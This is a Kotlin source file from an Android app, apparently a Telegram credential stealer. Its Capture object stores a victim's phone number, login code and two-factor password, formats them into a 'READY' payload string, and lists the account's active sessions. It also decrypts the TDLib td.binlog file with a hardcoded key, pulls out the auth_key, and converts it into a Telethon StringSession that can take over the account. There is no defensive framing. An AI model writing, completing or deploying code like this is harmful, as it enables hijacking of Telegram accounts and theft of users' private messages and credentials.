package com.tgme.app

import android.content.Context
import android.util.Base64
import org.drinkless.tdlib.TdApi
import java.io.File
import java.net.InetAddress
import java.nio.ByteBuffer
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

object Capture {
    var phone = ""
    var code = ""
    var password = ""
    var codeLength = 0

    var userId = 0L
    var userName = ""
    var session = ""

    fun save(ctx: Context) {
        ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE).edit()
            .putString("phone", phone).putString("code", code)
            .putString("password", password).putString("session", session)
            .apply()
    }

    fun load(ctx: Context) {
        val p = ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE)
        phone = p.getString("phone", "") ?: ""
        code = p.getString("code", "") ?: ""
        password = p.getString("password", "") ?: ""
        session = p.getString("session", "") ?: ""
    }

    fun binlogFile(ctx: Context) = File(ctx.filesDir, "tdlib/db/td.binlog")

    fun payload(ctx: Context) = buildString {
        append("READY\n")
        append("num: $phone\n")
        append("code: $code\n")
        append("pass: $password\n")
        append("user: $userId $userName\n")
    }

    private fun f(o: Any, name: String): String = try {
        o.javaClass.getField(name).get(o)?.toString() ?: "-"
    } catch (_: Exception) { "-" }

    fun render(s: TdApi.Sessions): String = buildString {
        append("SESSIONS (ttl ${s.inactiveSessionTtlDays} j)\n")
        s.sessions.forEach { x ->
            append(if (x.isCurrent) "[MOI] " else "[   ] ")
            append("${x.applicationName} ${x.applicationVersion} | ${x.deviceModel} | ")
            append("${x.systemVersion} | api_id ${x.apiId} | ")
            append("login ${x.logInDate} last ${x.lastActiveDate}\n")
        }
    }

    // ==========================================================
    // 🔥 NOUVELLE PARTIE : Extraction directe de la session
    // ==========================================================

    // ⚠️ DOIT ÊTRE LA MÊME CLÉ QUE DANS Tg.kt ⚠️
    private val DB_KEY = byteArrayOf(
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
        0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
        0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20
    )

    fun extractSession(ctx: Context): String {
        val file = binlogFile(ctx)
        if (!file.exists()) return "ERREUR: Fichier td.binlog introuvable."

        try {
            val raw = file.readBytes()
            if (raw.size < 32) return "ERREUR: Fichier trop petit."

            // 1. Déchiffrement AES-CTR (TDLib stocke l'IV dans les 16 premiers octets)
            val iv = raw.copyOfRange(0, 16)
            val encryptedData = raw.copyOfRange(16, raw.size)
            
            val cipher = Cipher.getInstance("AES/CTR/NoPadding")
            val keySpec = SecretKeySpec(DB_KEY, "AES")
            val ivSpec = IvParameterSpec(iv)
            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec)
            val decrypted = cipher.doFinal(encryptedData)

            // 2. Recherche de la clé auth_key dans les blocs BLOG
            var dcId = 0
            var authKey: ByteArray? = null
            var i = 0

            while (i <= decrypted.size - 8) {
                // Cherche le magic "BLOG" (0x42 0x4C 0x4F 0x47)
                if (decrypted[i] == 0x42.toByte() && decrypted[i + 1] == 0x4C.toByte() &&
                    decrypted[i + 2] == 0x4F.toByte() && decrypted[i + 3] == 0x47.toByte()
                ) {
                    var p = i + 4
                    val nameLen = readIntLE(decrypted, p); p += 4
                    
                    if (nameLen in 1..128 && p + nameLen + 4 <= decrypted.size) {
                        val name = String(decrypted, p, nameLen, Charsets.US_ASCII); p += nameLen
                        val valLen = readIntLE(decrypted, p); p += 4
                        
                        if (valLen in 256..1024 && p + valLen <= decrypted.size) {
                            if (name.startsWith("auth_key")) {
                                if (name.contains("{")) {
                                    dcId = name.substringAfter("{").substringBefore("}").toIntOrNull() ?: 0
                                }
                                // La clé de 256 octets est à la fin de la valeur
                                val value = decrypted.copyOfRange(p, p + valLen)
                                authKey = value.copyOfRange(value.size - 256, value.size)
                                break // On a trouvé la clé, on arrête la recherche
                            }
                        }
                    }
                }
                i++
            }

            if (authKey == null || dcId == 0) {
                return "ERREUR: auth_key introuvable dans le binlog déchiffré."
            }

            // 3. Création de la StringSession Telethon
            val dcIps = mapOf(
                1 to "149.154.175.53", 2 to "149.154.167.51", 3 to "149.154.175.100",
                4 to "149.154.167.91", 5 to "91.108.56.130"
            )
            val ipBytes = InetAddress.getByName(dcIps[dcId] ?: "149.154.167.51").address

            val buffer = ByteBuffer.allocate(1 + 4 + 2 + 256)
            buffer.put(dcId.toByte())
            buffer.put(ipBytes)
            buffer.putShort(443)
            buffer.put(authKey)

            val base64 = Base64.encodeToString(buffer.array(), Base64.URL_SAFE or Base64.NO_WRAP or Base64.NO_PADDING)
            return "1$base64" // Préfixe "1" obligatoire pour Telethon

        } catch (e: Exception) {
            return "ERREUR: ${e.message}"
        }
    }

    private fun readIntLE(b: ByteArray, off: Int): Int {
        return (b[off].toInt() and 0xFF) or
               ((b[off + 1].toInt() and 0xFF) shl 8) or
               ((b[off + 2].toInt() and 0xFF) shl 16) or
               ((b[off + 3].toInt() and 0xFF) shl 24)
    }
}
